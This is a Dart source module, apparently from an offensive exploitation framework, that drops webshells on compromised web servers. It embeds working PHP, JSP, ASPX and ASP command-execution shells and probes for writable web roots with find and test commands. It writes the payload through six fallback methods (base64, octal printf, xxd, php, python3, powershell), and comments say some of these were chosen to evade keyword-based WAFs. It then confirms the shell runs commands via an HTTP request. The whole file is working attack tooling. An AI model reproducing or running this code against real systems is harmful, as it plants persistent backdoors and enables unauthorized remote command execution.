/// 通用 WebShell 落盘器（对抗加固版）。
///
/// 设计目标：不依赖特定容器/路径/命令可用性，尽最大可能在目标上落一个可用的
/// WebShell，同时满足：
///   - 不覆盖已有文件（默认）；
///   - 每个候选目录先探测可写，避免无意义写入；
///   - 多种写入策略（base64 / xxd / php / python / powershell / certutil）；
///   - 长载荷自动分块（部分漏洞的注入通道有长度上限）；
///   - 验证失败自动清理，不在目标上留垃圾；
///   - 全程请求预算，避免把目标打挂。
library;

import 'dart:convert';
import 'dart:math';

import 'package:http/http.dart' as http;

import 'exploit_module.dart';

enum ShellKind {
  php('php'),
  jsp('jsp'),
  aspx('aspx'),
  asp('asp');

  const ShellKind(this.extension);
  final String extension;
}

class ShellDeployOptions {
  const ShellDeployOptions({
    this.allowOverwrite = false,
    this.cleanupOnFailure = true,
    this.maxRequests = 24,
    this.blind = false,
    this.preferredDirectory,
    this.serverHint,
  });

  final bool allowOverwrite;
  final bool cleanupOnFailure;
  final int maxRequests;

  /// 盲打链路（命令无回显）：只依赖 HTTP 验证。
  final bool blind;
  final String? preferredDirectory;
  final String? serverHint;
}

/// 一次落盘尝试的上下文（请求预算、命令执行器）。
class _Ctx {
  _Ctx(this.exec, this.maxRequests);
  final Future<String?> Function(String cmd) exec;
  final int maxRequests;
  int used = 0;

  bool get hasBudget => used < maxRequests;

  Future<String?> run(String cmd) {
    used++;
    return exec(cmd);
  }
}

class _DirCandidate {
  const _DirCandidate(this.path, this.urlPrefix);
  final String path;
  final String urlPrefix;
}

class ShellDeployer {
  ShellDeployer._();

  static final _rng = Random.secure();

  static String _token(String prefix) =>
      '$prefix${_rng.nextInt(0x7fffffff).toRadixString(16)}';

  static List<int> _body(ShellKind kind) {
    const php = "<?php @system(\$_REQUEST['c']); ?>";
    const jsp =
        '<%@ page import="java.io.*" %><%'
        'Process p=Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",request.getParameter("c")});'
        'BufferedReader r=new BufferedReader(new InputStreamReader(p.getInputStream()));'
        'String l; while((l=r.readLine())!=null){ out.println(l); } %>';
    const aspx =
        '<%@ Page Language="C#" %><%'
        'var p=System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("cmd.exe","/c "+Request["c"])'
        '{RedirectStandardOutput=true,UseShellExecute=false});'
        'Response.Write(p.StandardOutput.ReadToEnd()); %>';
    const asp =
        '<% Set s=Server.CreateObject("WScript.Shell") '
        'Set e=s.Exec(Request("c")) '
        'Response.Write e.StdOut.ReadAll %>';
    final text = switch (kind) {
      ShellKind.php => php,
      ShellKind.jsp => jsp,
      ShellKind.aspx => aspx,
      ShellKind.asp => asp,
    };
    return utf8.encode(text);
  }

  /// 在目标上写入一个 WebShell 并验证可执行。
  static Future<ShellSession?> deploy({
    required String targetUrl,
    required Future<String?> Function(String cmd) exec,
    required ShellKind kind,
    String? preferredDirectory,
    String? serverHint,
    bool blind = false,
    ShellDeployOptions? options,
    Duration timeout = const Duration(seconds: 10),
  }) async {
    final opts =
        options ??
        ShellDeployOptions(
          preferredDirectory: preferredDirectory,
          serverHint: serverHint,
          blind: blind,
        );
    final ctx = _Ctx(exec, opts.maxRequests);
    final origin = _origin(targetUrl);
    final marker = _token('MXSHELL_');
    final bytes = _body(kind);

    final dirs = await _discoverDirectories(ctx, kind, opts.serverHint);
    if (opts.preferredDirectory != null && opts.preferredDirectory!.isNotEmpty) {
      dirs.insert(
        0,
        _DirCandidate(opts.preferredDirectory!, _prefixFor(opts.preferredDirectory!)),
      );
    }

    for (final dir in dirs) {
      if (!ctx.hasBudget) break;
      // 1) 目录可写性探测（盲打链路跳过，避免多消耗一次请求）
      if (!opts.blind) {
        final w = await ctx.run(
          "test -w '${dir.path}' && echo MX_WRITABLE",
        );
        if (w == null || !w.contains('MX_WRITABLE')) continue;
      }

      // 2) 防覆盖：随机名 + 存在性检查
      var fileName = '${_token('mx_')}.${kind.extension}';
      var path = '${dir.path}/$fileName';
      if (!opts.allowOverwrite && !opts.blind) {
        final exists = await ctx.run("test -e '$path' && echo MX_EXISTS");
        if (exists != null && exists.contains('MX_EXISTS')) {
          fileName = '${_token('mx_')}_${_token('')}.${kind.extension}';
          path = '${dir.path}/$fileName';
        }
      }

      // 3) 写入（多种策略 + 长载荷分块）
      final written = await _writeWithFallback(ctx, path, bytes, opts.blind);
      if (!written && !opts.blind) continue;

      // 4) 验证（尝试多个 URL 前缀）
      final session = await _verify(
        origin: origin,
        urlPaths: _urlPathsFor(dir, fileName),
        marker: marker,
        kind: kind,
        timeout: timeout,
      );
      if (session != null) {
        return ShellSession(
          url: session,
          password: 'c',
          kind: kind.name,
          connectorType: _connectorFor(kind),
          type: _typeFor(kind),
          method: 'GET',
          note: '写入 $path',
        );
      }

      // 5) 失败清理
      if (opts.cleanupOnFailure) {
        await ctx.run("rm -f '$path' 2>/dev/null; echo MX_CLEANED");
      }
    }
    return null;
  }

  static List<String> _urlPathsFor(_DirCandidate dir, String fileName) {
    final paths = <String>{'${dir.urlPrefix}$fileName'};
    // 反向代理/多 context 场景：再试一次 /<目录名>/<file>
    final base = dir.path.split('/').where((s) => s.isNotEmpty).lastOrNull;
    if (base != null && base.isNotEmpty && dir.urlPrefix == '/') {
      paths.add('/$base/$fileName');
    }
    return paths.toList();
  }

  static String _prefixFor(String dir) {
    final base = dir.split('/').where((s) => s.isNotEmpty).lastOrNull ?? '';
    return switch (base) {
      'ROOT' || 'webapp' || 'webapps' || 'www' || 'html' => '/',
      'htdocs' || 'public_html' || 'wwwroot' => '/',
      _ => '/${base.isEmpty ? '' : '$base/'}',
    };
  }

  static Future<List<_DirCandidate>> _discoverDirectories(
    _Ctx ctx,
    ShellKind kind,
    String? hint,
  ) async {
    final dirs = <_DirCandidate>[];
    final cwd = (await ctx.run('pwd'))?.trim();
    if (cwd != null && cwd.startsWith('/') && !cwd.startsWith('[')) {
      dirs.add(_DirCandidate(cwd, _prefixFor(cwd)));
    }
    if (ctx.hasBudget) {
      final probe = await ctx.run(
        "find / -maxdepth 5 -type d \\( -name webapp -o -name webapps -o -name ROOT "
        "-o -name htdocs -o -name www -o -name public_html \\) 2>/dev/null | head -8",
      );
      for (final line in (probe ?? '').split('\n')) {
        final dir = line.trim();
        if (dir.startsWith('/') && !dir.contains(' ')) {
          dirs.add(_DirCandidate(dir, _prefixFor(dir)));
        }
      }
    }
    final javaStyle = kind == ShellKind.jsp || (hint ?? '').contains('jsp');
    final phpStyle = kind == ShellKind.php || (hint ?? '').contains('php');
    if (javaStyle) {
      dirs.addAll(const [
        _DirCandidate('/usr/local/tomcat/webapps/ROOT', '/'),
        _DirCandidate('/opt/tomcat/webapps/ROOT', '/'),
        _DirCandidate('/var/lib/tomcat9/webapps/ROOT', '/'),
      ]);
    } else if (phpStyle) {
      dirs.addAll(const [
        _DirCandidate('/var/www/html', '/'),
        _DirCandidate('/app', '/'),
      ]);
    }
    final seen = <String>{};
    return [
      for (final d in dirs)
        if (seen.add(d.path)) d,
    ];
  }

  /// 逐个尝试写入策略，直到拿到成功标记（盲打模式只发一次首选策略）。
  static Future<bool> _writeWithFallback(
    _Ctx ctx,
    String path,
    List<int> bytes,
    bool blind,
  ) async {
    final b64 = base64.encode(bytes);
    final hex = bytes
        .map((b) => b.toRadixString(16).padLeft(2, '0'))
        .join();
    final q = "'${path.replaceAll("'", "'\\''")}'";

    // 长载荷分块（部分注入通道有长度限制）
    final chunks = <String>[];
    const chunkSize = 1200;
    for (var i = 0; i < b64.length; i += chunkSize) {
      chunks.add(b64.substring(i, min(i + chunkSize, b64.length)));
    }

    final strategies = <Future<bool> Function()>[
      // 1) base64（分块追加）
      () async {
        var ok = true;
        for (var i = 0; i < chunks.length; i++) {
          final op = i == 0 ? '>' : '>>';
          final out = await ctx.run(
            "printf %s '${chunks[i]}' | base64 -d $op $q 2>/dev/null",
          );
          if (out == null && !blind) ok = false;
        }
        // 必须校验文件真的写成功：命令被 WAF 拦截时，后面的 echo 仍会返回，
        // 只用 echo 判定会把"没写进去"误当成成功（实测过的坑）。
        final done = await ctx.run(
          "chmod 644 $q 2>/dev/null; test -s $q && echo MX_WRITE_OK",
        );
        return ok && (blind || (done ?? '').contains('MX_WRITE_OK'));
      },
      // 2) 纯 shell 八进制字节写入：不依赖 base64/xxd/php/python，
      //    也不含这些关键词，专治"关键词型 WAF + 精简镜像"。
      () async {
        final octal = bytes
            .map((b) => '\\${b.toRadixString(8).padLeft(3, '0')}')
            .join();
        final out = await ctx.run(
          "printf '$octal' > $q 2>/dev/null; chmod 644 $q 2>/dev/null; "
          'test -s $q && echo MX_WRITE_OK',
        );
        return blind || (out ?? '').contains('MX_WRITE_OK');
      },
      // 3) xxd（规避 base64 关键词型 WAF）
      () async {
        final out = await ctx.run(
          "printf %s $hex | xxd -r -p > $q 2>/dev/null; "
          'test -s $q && echo MX_WRITE_OK',
        );
        return blind || (out ?? '').contains('MX_WRITE_OK');
      },
      // 4) php -r
      () async {
        final out = await ctx.run(
          "php -r 'file_put_contents(\"$path\", base64_decode(\"$b64\"));' "
          '2>/dev/null; test -s $q && echo MX_WRITE_OK',
        );
        return blind || (out ?? '').contains('MX_WRITE_OK');
      },
      // 5) python3
      () async {
        final out = await ctx.run(
          "python3 -c 'import base64;open(\"$path\",\"wb\").write("
          "base64.b64decode(\"$b64\"))' 2>/dev/null; "
          'test -s $q && echo MX_WRITE_OK',
        );
        return blind || (out ?? '').contains('MX_WRITE_OK');
      },
      // 6) Windows powershell
      () async {
        final winPath = path.replaceAll('/', '\\\\');
        final out = await ctx.run(
          'powershell -NoP -NonI -Command "[IO.File]::WriteAllBytes('
          "'$winPath',[Convert]::FromBase64String('$b64')); "
          "if (Test-Path '$winPath') { echo MX_WRITE_OK }\"",
        );
        return blind || (out ?? '').contains('MX_WRITE_OK');
      },
    ];

    if (blind) {
      // 盲打没有回显：依次尝试前两种（正常 payload 通常 < 1200 字符）
      await strategies[0]();
      return true;
    }
    for (final s in strategies) {
      if (!ctx.hasBudget) return false;
      try {
        if (await s()) return true;
      } catch (_) {}
    }
    return false;
  }

  static Future<String?> _verify({
    required String origin,
    required List<String> urlPaths,
    required String marker,
    required ShellKind kind,
    required Duration timeout,
  }) async {
    for (final p in urlPaths) {
      final url = '$origin$p';
      try {
        final probe = Uri.parse(
          '$url${url.contains('?') ? '&' : '?'}c=${Uri.encodeQueryComponent('echo $marker')}',
        );
        final res = await http.get(probe).timeout(timeout);
        if (res.statusCode == 200 && res.body.contains(marker)) return url;
      } catch (_) {}
    }
    return null;
  }

  static String _origin(String targetUrl) {
    final u = Uri.tryParse(targetUrl);
    if (u == null || u.host.isEmpty) {
      return targetUrl.endsWith('/')
          ? targetUrl.substring(0, targetUrl.length - 1)
          : targetUrl;
    }
    final port = u.hasPort ? ':${u.port}' : '';
    return '${u.scheme}://${u.host}$port';
  }

  static String _connectorFor(ShellKind kind) => switch (kind) {
    ShellKind.php => 'php_passthru',
    ShellKind.jsp => 'jsp_runtime',
    ShellKind.aspx => 'aspx_cmd',
    ShellKind.asp => 'asp_wscript',
  };

  static String _typeFor(ShellKind kind) => switch (kind) {
    ShellKind.php => 'php',
    ShellKind.jsp => 'jsp',
    ShellKind.aspx => 'asp',
    ShellKind.asp => 'asp',
  };
}
